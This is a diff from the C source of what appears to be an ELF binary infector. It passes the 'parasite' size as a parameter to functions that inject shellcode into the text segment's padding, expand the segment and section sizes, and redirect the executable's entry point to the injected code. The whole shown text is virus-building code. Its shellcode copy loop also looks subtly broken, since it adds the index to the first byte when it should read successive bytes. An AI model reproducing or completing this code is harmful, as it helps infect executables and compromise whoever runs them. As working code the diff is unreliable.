@@ -53,14 +53,14 @@ err1:
 static void target_insert_shellcode(Target *this, Shellcode     \
         *shellcode)
 {
-    for(int i = 0; i < this->parasite_size; i++){
+    for(int i = 0; i < shellcode->m_size; i++){
         this->m_elf->m_map[this->text_end + i] = (*((uint8_t *) \
             shellcode->m_shellcode) + i);
     }
 }
 
 /* to adjust section headers and other offsets */
-static void target_adjust_sections(Target *this)
+static void target_adjust_sections(Target *this, int parasite_size)
 {
     this->m_elf->m_ehdr->e_entry = this->parasite_addr;
     for(int i = 0; i < this->m_elf->m_ehdr->e_shnum; i++){
@@ -80,14 +80,14 @@ static void target_adjust_sections(Target *this)
             if(this->m_elf->m_shdr[i].sh_addr + this->m_elf->   \
                     m_shdr[i].sh_size == this->parasite_addr){
                 this->m_elf->m_shdr[i].sh_size +=               \
-                    this->parasite_size;
+                    parasite_size;
             }
         }
     }
 }
 
 /* find free space in target binary */
-static int target_find_free_space(Target *this)
+static int target_find_free_space(Target *this, int parasite_size)
 {
     bool text_found = false;
     for(int i = 0;i < this->m_elf->m_ehdr->e_phnum; i++){
@@ -101,13 +101,13 @@ static int target_find_free_space(Target *this)
                 p_vaddr + this->text_filesize;
 
             /* resizing p_filesz and p_memsz */
-            this->m_elf->m_phdr[i].p_filesz += this->parasite_size;
-            this->m_elf->m_phdr[i].p_memsz += this->parasite_size;
+            this->m_elf->m_phdr[i].p_filesz += parasite_size;
+            this->m_elf->m_phdr[i].p_memsz += parasite_size;
             text_found = true;
 
         } else if (this->m_elf->m_phdr[i].p_type == PT_LOAD &&  \
             (this->m_elf->m_phdr[i].p_offset - this->text_end)  \
-            < this->parasite_size && text_found){
+            < parasite_size && text_found){
             this->available_freespace = this->m_elf->m_phdr[i]. \
                 p_offset - this->text_end;
             printf("segment found with a gap of %d\n", this->   \
